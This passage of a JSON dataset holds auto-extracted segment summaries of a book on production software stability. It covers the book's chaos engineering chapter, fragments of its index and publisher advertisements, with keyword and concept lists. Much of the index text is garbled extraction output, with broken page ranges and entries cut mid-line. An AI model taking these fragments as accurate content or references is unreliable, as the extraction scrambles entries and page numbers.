Netflix, chaos is an opt-out process.\nThat means every service in production will be subject to Chaos Monkey.\nThat isn’t just a paper process...exempt services go in a database that Chaos Monkey consults.\nOther companies adopting chaos engineering have chosen an opt-in approach.\nWhen you’re adding chaos to an organization, consider starting with opting in.\nChaos Engineering • 330\nFirst of all, your chaos engineering efforts can’t kill your company or your customers.\nIf every single request in your system is irreplaceably valuable, then chaos engineering is not the right approach for you.\nThe whole point of chaos engineering is to disrupt things in order to learn how the system breaks.\nYou also want a way to limit the exposure of a chaos test.\nThe hypothesis behind Chaos Monkey was, “Clustered services should be unaffected by instance failures.” Observations quickly invalidated that hypothesis.\nInjecting Chaos\nYou know the structure of the system well enough to guess where you can kill an instance, add some latency, or make a service call fail.\nThese are all “injec- tions.” Chaos Monkey does one kind of injection: it kills instances.",
    "keywords": [
      "Chaos Engineering",
      "Chaos",
      "Chaos Monkey",
      "system",
      "Chaos Engineering Chaos",
      "systems",
      "Engineering Chaos engineering",
      "Engineering",
      "Monkey",
      "n’t",
      "Introducing price point",
      "make",
      "Chaos Engineering Imagine",
      "report erratum",
      "Introducing price"
    ],
    "concepts": [
      "engineering",
      "engineer",
      "engineers",
      "chaos",
      "systems",
      "monkey",
      "monkeys",
      "change",
      "changing",
      "service"
    ]
  },
  {
    "chapter_number": 41,
    "title": "Segment 41 (pages 334-342)",
    "start_page": 334,
    "end_page": 342,
    "summary": "Chaos Engineering • 332\nNetflix uses failure injection testing (FIT) to inject more subtle failures.4 (Note that this is not the same “FIT” as the “framework for integrated testing” in Nonbreaking API Changes, on page 263.) FIT can tag a request at the inbound edge (at an API gateway, for example) with a cookie that says, “Down the line, this request is going to fail when service G calls service H.” Then at the call site where G would issue the request to H, it looks at the cookie, sees that this call is marked as a failure, and reports it as failed, without even making the request.\n(Netflix uses a common framework for all its outbound service calls, so it has a way to propagate this cookie and treat it uniformly.)\nBut which instances, connections, and calls are interesting enough to inject a fault?\nAnd where should we inject that fault?\nIntroducing Chaos to Your Neighbors by: Nora Jones , Senior Software Engineer and Coauthor of Chaos Engineering (O’Reilly, 2017)\nI was hired as the first and only person working on internal tools and developer productivity at a brand new e-commerce startup during a pivotal time.\nAbout two weeks into my role at this company, my manager asked me if we could start experimenting with chaos engineering to help detect some of these issues before they became major outages.\nGiven that I was new to the company and didn’t know all my col- leagues yet, I started this effort by sending an email to all the developers and business owners informing them we were beginning implementation of chaos engineering in QA and if they considered their services “unsafe to chaos” to let me know and they could opt out the first round.\nMoral of the story: chaos engineering is a quick way to meet your new colleagues, but it’s not a great way.\nProceed with caution and control your failures delicately, especially when it’s the first time you’re enabling chaos.\nThis is how Chaos Monkey works.\nIf you’re just getting started with chaos engineering, then random selection is as good a process as any.\n(More about that later in this chapter.) When you inject faults into service-to-service calls, you’re searching for the crucial calls.\nLater, when using that data to present an API response, a service throws an exception and returns a 500 response code.\nRandomness works well at the beginning because the search space for faults is densely populated.\nSome services, some network segments, and some combina- tions of state and request will still have latent killer bugs.\nBut imagine trying to exhaustively search a dimensional space, where n is the number of calls from service to service.\nThis is why it’s important to study all the times when faults happen without failures.\nThe system did something to keep that fault from becoming a failure.\nChaos Engineering • 334\nUsing those traces, it’s possible to build a database of inferences about what services a request type needs.\n(See Automate and Repeat, on page 334, to read about ChAP, Netflix’s experimentation platform.) Once that link is cut, we may find that the request continues to succeed.\nMaybe there’s a secondary service, so we can see a new call that wasn’t previously active.\nPeter calls this building a “cunning malevolent intelligence.” It can dramatically reduce the time needed to run productive chaos tests.\nWith a known class of vulnerability, it’s time to find a way to automate testing.\nThere’s such a thing as too much chaos.\nIf the injection simulates a request failure between service G to service H, then it isn’t meaningful to simultaneously fail requests from G to every fallback it uses when H isn’t working!\nCompanies with dedicated chaos engineering teams are all building platforms that let them decide how much chaos to apply, when, to whom, and which services are off-limits.\nChaos isn’t always about faults in the software.\nHigh-reliability organizations use drills and simulations to find the same kind of systemic weaknesses in their human side as in the software side.\nYou can make this more fun by calling it a “zombie apocalypse simulation.” Randomly select 50 percent of your people and tell them they are counted as zombies for the day.\nAs with Chaos Monkey, the first few times you run this simulation, you’ll immediately discover some key processes that can’t be done when people are out.\nhttps://medium.com/netflix-techblog/chap-chaos-automation-platform-53e6d528371f\nChaos Engineering • 336\nIt’s probably not a good idea to combine fault injections together with a zombie simulation for your very first run-through.\nChaos engineering starts with paradoxes.\nWe need to break things—regularly and in a semicon- trolled way—to make the software and the people who build it more resilient.\nContinuous Delivery: Reliable Software Releases Through Build, Test, and Deployment Automation.\nDIGITS 12-factor app, 150–151 202 response code, back\n5 a.m. problem, 38–43 503 Service Unavailable re-\nback pressure, 121 let it crash pattern, 108–\nadaptation, 289–324\nexplicit context, 306–\n313–323\nloose clustering, 305 messages, events, and commands, 314–316 painless releases, 295 platform team, 292–294 process and organization,\n290–301\nservice extinction, 296–\nsystem architecture, 301–\nadvantages, 4 change and, 289 decision loops, 291 airline case study, 9–21, 27–\nAlvaro, Peter, 334 Amazon Machine Images (AMIs), packaging, 245 Amazon Web Services (AWS) Code Pipeline, 243 concerns about dependen-\nin foundation layer, 152 Key Management Service\nS3 service outage, 195–\nchanges, 265, 268–270\nversioning nonbreaking changes, 263–268\nadaptation and informa- tion architecture, 313– 323\narchitecture, 301–313\nlayered, 302–303 pragmatic vs.\nsecurity, 218–222 session fixation, 218 session prediction attack,\nchaos engineering, 334 data collection for prob-\ndeployment, 242–246 efficiency cautions, 301 force multiplier antipat- tern, 80–84, 123, 194 governor pattern, 123–\nHTTP APIs, 210 lack of judgment, 197 mapping, 246 speed of failure, 196 autonomy, team-scale, 298 autoscaling, see also scaling chain reactions, 49 costs, 52, 77, 202 force multiplier antipat- tern, 81, 123, 196 let it crash pattern, 110 pre-autoscaling, 71 self-denial attacks, 71 unbalanced capacities,\nstability pattern, 120–123 unbalanced capacities,\npartitioning traffic, 145 serialization and session failover in ecommerce case study, 287 Baldwin, Carliss Y., 308–313 bastion servers, 153 bell-curve distribution, 88 bidirectional certificates, 230 Big-IP, 180 binding\nports, 151 process binding, 100 black box technology, 165–\nBlack Friday case study, 129–\nBlack Monday example, 86–\nblue/green deployments, 295 bogons, 55, 185 bonding interfaces, 144 Bonnie 64, 147 broadcasts, 73 broken access control, 222–\npipeline, 243–247, 261 manual checks for deploy-\nstability pattern, 98–101 unbalanced capacities,\n64–66",
    "keywords": [
      "Chaos Engineering",
      "Chaos",
      "service",
      "n’t",
      "API",
      "Engineering",
      "request",
      "calls",
      "report erratum",
      "system",
      "Software",
      "Boston",
      "automation chaos engineering",
      "Chaos Monkey",
      "failure"
    ],
    "concepts": [
      "service",
      "services",
      "chaos",
      "failure",
      "failures",
      "api",
      "apis",
      "things",
      "thing",
      "pattern"
    ]
  },
  {
    "chapter_number": 42,
    "title": "Segment 42 (pages 343-353)",
    "start_page": 343,
    "end_page": 353,
    "summary": "live control, 210 memory leaks, 105 memory limits, 67, 105 metrics, 206 monitoring hit rates, 67 proxies, 66 service discovery, 188 sessions, 58 shared resources scaling\ncrushed ecommerce site case study, 284–288\ndefined, 52 demand control, 182–186 drift and, 327 judging load capacity by concurrent users, 281 judging load capacity by\nmodeling, 77 unbalanced capacities stability antipattern, 75–78, 112\nterns, 51–55 cascading failures\nblocked threads, 50, 68 chain reactions, 48 circuit breakers, 50, 98 fail fast pattern, 107 slow responses, 85 stability antipattern, 49–\n277–288\ndeployment army, 237–\nusing postmortems, 14–\ncatalog service example, 316–\nblocked threads, 48, 68 cascading failures, 48 splitting, 47, 49 stability antipattern, 46–\nchaos engineering, 325–336 automation and repeti-\ndisaster simulations, 335 environments, 325 injecting chaos, 331–332 precursors, 326–328 prerequisites, 330 Simian Army, 328–335 targeting chaos, 333 test harnesses, 116\nChaos Monkey, 328–335 ChAP (Chaos Automation\n45–46, 98\nlet it crash pattern, 111 live control, 210 logging, 97 scope, 97 slow responses, 98 stability pattern, 95–98 thresholds, 96 with timeouts, 94, 98 unbalanced capacities,\ncontainers in, 153 networking and founda- tion layer, 142–146 virtual machines in, 152\nguidelines for, 157–160 native, 87 separating out log files,\nture, 314–316 live control, 210\npoint-to-point communi- cation scaling effects, 72–73, 75\ncompetitive intelligence, 59–\nlet it crash pattern, 108–\nment tools guidelines, 206–207\nfiles, 160 guidelines for, 160–162 immutable infrastruc-\nduration of TCP, 40 live control, 210 metrics, 205 outbound, 146 queue backups, 183 test harnesses, 114–117\nconstraints and rollout, 260–\n149–153\nload balancing, 150 log collectors, 204 log files, 166 packaging, 245 ports, 149 security, 225, 231 software-defined network-\ncontent-based routing, 181 context, implicit, 306 context, explicit, 306–307,\n206–207\ncontainers, 149–152 control plane layer, 141,\n193–214 costs, 194 defined, 193 development environ-\ntern, 83–84\nin layer diagram, 141 level of, 193 live control, 209–212 platform and ecosystem,\n197–199\nplatform services, 212–\nshopping list, 213 transparency, 200–206 virtual machines in the\ngateway page, 286 pairing, 229 scrapers and spiders, 59–\n57–60\ncore facilities (CF) airline case study, 9–21, 27–30, 98\nairline case study, 28–29 avoiding with log files,\npattern, 108–111\n14–20\nautomated, 12 containers, 152 thread dumps, 16–18,\ntransparency, 163–170 data encryption keys, 226,\nconstraints, 260–261 data purging, 102, 107 dead connection detec-\ndeployment, 250–255,\n259–261\n216–218\n86–90, 94\ndebug logs, 167 deceleration zones, 84 decision cycle, 290–292 decoupling middleware\n45–46, 117\nself-denial attacks, 70 stability pattern, 117–119 total decoupling, 119\ndemand control, 182–186, see\nself-denial attacks, 69–\nassignment, 244 automated, 242–246 avoiding planned down-\nbuild pipeline and, 243–\ncase study, 237–239 choices, 241 cleanup phase, 259 continuous, 246–260 convergence, 245, 257 coordinated deployments,\ncosts, 239 databases, 250–255,\n259–261 defined, 156 delivery guidelines, 245 deployment services guidelines, 207\ndesigning for, 241–262 diagram, 156 drain period, 249 immutable infrastruc-\nmanual checks, 247 packaging, 245 painless releases, 295 phases, 248–260 placement services, 209 preparation, 248–257 risk cycle, 246 rolling, 248 rollout phase, 257–259 session affinity, 255 speed, 246, 248, 257 time-frame, 248–250 trickle, then batch, 254–\n180 discovery services DNS, 172–173\ning, 175–177\n173–177\nload balancing, 173–177 resolving hostnames, 143 round-robin load balanc-\ning, 173–174\n172–173\non, 64–66\nture, 314–316\n296, 302–313\nexecutables, defined, 156 explicit context, 306–307, 320 extinction, service, 296–298\nlatency problems, 94 slow responses, 86, 107 stability pattern, 106–108\nchain of failure, 28–30 defined, 29 isolation and splitting\ntion, 27–29\n80–84, 123, 194\nFord, Neal, 302 form follows failure, 301 foundation layer, 141–154 in layer diagram, 141 networking, 142–146 physical hosts, virtual\nmachines, and contain- ers, 146–153 Fowler, Martin, 314 FQDN (fully qualified domain\nweak references, 53–54,\ndisaster recovery, 180 with DNS, 175–177 global state and implicit con-\nthreads example, 64–66\n123–125, 194, 296 Gregorian calendar, 129 GSLB, see global server load\nstability pattern, 111–113 TCP, 36, 111, 183 unbalanced capacities,\nlems, 52–54\ndefined, 143 machine identity, 143–\nidentifiers, services, 316–318 ignorance, principle of, 305 immutable infrastructure code guidelines, 158 deployment, 245 domain objects, 64 packaging, 245 rollout example, 258 steady state pattern, 101\nadaptation, 313–323 information leakage, 224 infrastructure, see immutable\ninjection vulnerabilities, 216–\nChaos Monkey, 331 code guidelines, 157–160 configuration guidelines,\n160–162 defined, 155 health checks, 169, 180 instances layer, 141,\n155–170\n171–191\nload balancing, 173–182 loose clustering, 305 metrics, 169 porting modules, 312 transparency guidelines, 162–170, 200–206 insufficient attack prevention,\ncascading failures, 50 circuit breakers, 45–46,\n45–46, 117\n35–43\nstability antipatterns, 33–\nstrategies for, 45–46 vendor API libraries, 44\nexplicit context, 307 overspecification, 272 test harnesses, 45, 113–\ndemand control, 182–186 different solutions for dif-\nDNS, 173–177 interconnection layer,\n141, 171–191\nload balancing, 173–182\nnetwork routing, 186–188 service discovery with\nDNS, 172–173\nmachine identity, 143–\nbonding interfaces, 144 containers, 149–150 default gateways, 186 load balancing with DNS,\n173–177\n149–150, 187\nthread dumps, 16–18 Java Concurrency in Practice,\nK Kafka, 315 Kerberos, 220–221 key encryption keys, 226, 233 Key Management Service\ndata purging, 102 fail fast, 94 as lagging indicator, 134 Latency Monkey, 331 test harnesses, 116 timeouts, 94 Latency Monkey, 331 layer 7 firewalls, 227 layered architecture, 302–303 leader election, 206, 305 Leaky Bucket pattern, 97\n108–111\n183–184\nsessions, 281 live control, 210 load shedding, 119–120,\nload testing, 26, 281–284\nbulkheads, 100 canary deployments, 257 chain reactions, 46–49 containers, 150 with DNS, 173–177 fail fast pattern, 106 guidelines, 177–182\ning, 173–174\nload shedding, 119–120, 122,\n281–284\nbreaking API changes, 268– 271\nlog collectors, 204–206, 227 log indexing, 204 Log4j, 17 logging and log files\ndebug logs, 167 indexing logs, 204 levels of logging, 166 log collectors, 204–206,\nlog file locations, 166 logging servers, 104–105 for postmortems, 16–18 readability, 167 rotating log files, 103–104 software load balancing,\ncy, 204–206\ntransparency, 165–169,\n204–206\nenumeration, 187 networks, 143–146, 152 virtual machines in the\npatterns, 60–62\nheap, 52–54 in-memory caching stabil-\ntraffic problems, 52–54 weak references, 53–54,\nture, 314–316\nsynchronizing, 64–66 metric collectors, 204–206 metrics\naggregating, 204 blocked threads, 63 circuit breakers, 97 guidelines, 204 instance, 169 metric collectors, 204–\ncy, 204–206 thresholds, 206\nmodular operators, 308–313 modules\n200–201\ncircuit breakers, 97 stability and, 62–69\nfully qualified domain name (FQDN), 143 machine identity, 143–\nfoundation layer, 142–\nintegration points stabili- ty antipatterns, 33–46 interface names, 143–146 machine identity, 143–\noverlay networks, 149 routing guidelines, 186–\nTCP basics, 36–38 test harnesses, 114–117 VPNs, 186 New Relic, 200 nginx, 179 NICs\ndefault gateways, 186 loopback, 143 machine identity, 143–\nment in past, 292 operators, modular, 308–313 optimistic locking, 70 Oracle, see also JDBC driver\nOWASP Top 10, 216–231\n222–224\n219, 221, 228 injection, 216–218\nsession hijacking, 218–\n216–218 Parsons, Rebecca, 302 partitioning\n98–101\ncontrol plane, 197–199 costs, 202 goals, 293–294 platform services and\nlines, 212–213\nroles, 197–199, 292–294,\nplurality, embracing, 321–322 point-to-point communication scaling effects, 72–73, 75\nairline case study, 14–20 Amazon Web Services S3 service outage, 195– 197\nbinding, 100 circuit breaker scope, 97 code guidelines, 157–160 configuration guidelines,\n160–162 defined, 156 deployment diagram, 156 instances layer, 155–170 let it crash pattern, 109\n162–170\n193–214\ncosts, 3 foundation layer, 141–\n155–170\n141, 171–191\nlayer diagram, 141, 171 need for, 1–6 priorities, 141 security layer, 215–234\ncrushed ecommerce site case study, 278–281\nback pressure, 120–123 backups and system fail-\n119, 183–184 load shedding, 120 point-to-point communi- cation scaling effects, 73\nreactions, 46–49\n200–201\n80–83, 123, 194, 196\ndeployment, 250–252,\nblocked threads, 64, 68 cascading failures, 50 data purging, 102, 107 fail fast pattern, 106 load shedding, 119, 184 metrics, 205 scaling effects of shared\n102–106 timeouts, 92 virtual machines, 147\n129–139, 163\n277–288\n257–259\n173–174\ncontent-based, 181 guidelines, 186–188 software-defined network-\n200–201",
    "keywords": [
      "global server load",
      "airline case study",
      "HTTP Strict Transport",
      "fail fast pattern",
      "ecommerce case study",
      "DNS round-robin load",
      "Common Weakness Enumer",
      "Key Management Service",
      "discovery services DNS",
      "judging load capacity",
      "round-robin load balancing",
      "server load balanc",
      "failure injection testing",
      "case study",
      "Chaos Automation Platform"
    ],
    "concepts": [
      "service",
      "services",
      "deployments",
      "deployment",
      "deploy",
      "pattern",
      "patterns",
      "defined",
      "failures",
      "failure"
    ]
  },
  {
    "chapter_number": 43,
    "title": "Segment 43 (pages 354-361)",
    "start_page": 354,
    "end_page": 361,
    "summary": "scaling effects in point-to- point communication, 72–73\nscaling effects stability antipattern, 71–75 self-denial attacks, 70 unbalanced capacities,\nment, 252–255, 260\nstability problems, 59–60\nAPIs, 230 attack surfaces, 225 authentication, 218–222 blacklists, 227 broken access control,\n222–224\ninformation leakage, 224 injection, 216–218 insufficient attack preven-\nlogging bad requests, 227 malicious users, 60–62 misconfiguration, 225 as ongoing process, 233 OWASP Top 10, 216–231 pie crust defense, 220,\nsample applications, 225 script kiddies, 61 security layer, 215–234 sensitive data exposure,\nsession fixation, 218 session hijacking, 218–\nURL dualism, 321 self-contained systems, 303 self-denial attacks, 69–71, 76 sensitive data exposure, 226 serialization and session\nservice extinction, 296–298 service-oriented architecture\n316–318 defined, 155\nservice extinction, 296–\n219, 221, 228 generating, 219 self-denial attacks, 71 session hijacking, 218–\nheap memory, 52–54 judging load capacity by\noff-heap memory, 54 replication in crushed ecommerce site case study, 284–288 session affinity, 255 session fixation, 218 session hijacking, 218–\n57–60\ncircuit breakers, 98 fail fast pattern, 107 handshaking, 112 as indistinguishable from crashes, 63–64, 84\n35–43\nstability problems, 59–60\nchain of failure, 28–30 costs of poor stability, 23 defined, 24 failure modes, 26–28 global growth in users,\ntion, 27–29\nstability antipatterns, 31–90, see also slow responses; threads, blocked\ncascading failures, 48– 51, 85, 94, 98, 107 chain reactions, 46–49,\nintegration points, 33–\nscaling effects, 71–75 self-denial attacks, 69–\n75–78, 98, 112\n86–90, 94 users, 51–62\nstability patterns, 91–125, see also circuit breakers; timeouts\nback pressure, 76, 120–\n98–101\n111–113\nlet it crash, 108–111 load shedding, 119–120,\nsteady state, 89, 101–106 test harnesses, 45, 77,\n113–117\n101–106\nstability pattern, 101–106 unbounded result sets,\njects, 64–66\narchitecture, 301–313\ncy, 163, 200–206\ncascading failures, 49–51 queue backups, 182 slow processes vs.\nes, 63–64\n5 a.m. problem, 38–43 back pressure, 121 connection duration, 40 handshaking, 36, 111,\n35–43\nload shedding, 119 multicasts, 73 networking basics, 36–38 number of socket connec-\n292–294, 299\nstability pattern, 113–117 unbalanced capacities,\nload, 26, 281–284 longevity tests, 25 overfocus on, 1 stress, 62, 68, 78 unbalanced capacities,\nfor postmortems, 16–18\nes, 63–64\nstability antipattern, 62–\non domain objects, 64– 66\nairline case study, 27 blocked threads, 68–69,\nlatency problems, 94 live control, 210 stability pattern, 91–95 TCP sockets, 37, 41 unbounded result sets,\nterns, 51–55\ndata collection, 163–170 designing for, 164 economic value, 200–201 instance-level, 162–170 logs and stats, 165–169,\n204–206\n200–201\nsystem-level, 163, 200–\ntions, 254–255\ncircuit breakers, 98 handshaking, 76, 112 stability antipattern, 75–\nunbounded result sets, 86–\n222–224\ndualism, 318–321 probing, 223 session-sensitive, 223 version discriminator,\nmalicious, 60–62 metrics, 205 real-user monitoring and transparency, 200–201\nstability antipatterns, 51–\ntraffic problems, 51–55 unwanted, 57–60\nversion control, 158, 161 VersionEye, 229 versioning, 263–273 deployment, 255 events, 315 handling others’ versions,\n270–273\n263–270\nvirtual LANs (VLANs), 149–\nin foundation layer, 146–\nVLANs, see virtual LANs VLANs (virtual LANs), 149–\nW WannaCry ransomware, 215 weak references, 53–54, 67 web assets, deployment, 255 Weinberg, Gerald, 327 “‘What Do You Mean by ’Event-Driven’?”, 314 white-box technology, 164 whitelists, 227 Why People Believe Weird\nHTML5 and CSS3 are more than just buzzwords – they’re the foundation for today’s web applications.",
    "keywords": [
      "session prediction attack",
      "integration point failures",
      "HTTP Strict Transport",
      "ecommerce case study",
      "load stability pattern",
      "services service extinction",
      "unbounded result sets",
      "scaling effects stability",
      "effects stability antipattern",
      "point failures",
      "airline case study",
      "session prediction",
      "Java thread dumps",
      "case study",
      "ery services service"
    ],
    "concepts": [
      "session",
      "sessions",
      "attacks",
      "attack",
      "failures",
      "failure",
      "users",
      "user",
      "stability",
      "data"
    ]
  },
  {
    "chapter_number": 44,
    "title": "Segment 44 (pages 362-366)",
    "start_page": 362,
    "end_page": 366,
    "summary": "A book on mazes?\n$38 https://pragprog.com/book/jbmaze\n$34 https://pragprog.com/book/mcmath\n$36 https://pragprog.com/book/atcrime\n$24 https://pragprog.com/book/rjnsd\nThis Book’s Home Page https://pragprog.com/book/mnee2 Source code from this book, errata, and other resources.\nRegister for Updates https://pragprog.com/updates Be notified when updates and new books become available.\nJoin the Community https://pragprog.com/community Read our weblogs, join our online discussions, participate in our mailing list, interact with our wiki, and benefit from the experience of other Pragmatic Programmers.\nNew and Noteworthy https://pragprog.com/news Check out the latest pragmatic developments, new titles and other offerings.\nIt’s available for purchase at our store: https://pragprog.com/book/mnee2\nhttps://pragprog.com/catalog\nacademic@pragprog.com",
    "keywords": [
      "Rediscover the joy",
      "Math Rediscover",
      "book",
      "joy and fascinating",
      "Joy",
      "Pragmatic",
      "Mazes",
      "fascinating weirdness",
      "Pragmatic Programmers",
      "code",
      "ISBN",
      "Rediscover",
      "Pragmatic Bookshelf",
      "Good Math",
      "Joy of Mazes"
    ],
    "concepts": [
      "book",
      "books",
      "pragmatic",
      "pages",
      "good",
      "liked",
      "mazes",
      "maze",
      "software",
      "development"
    ]
  }
]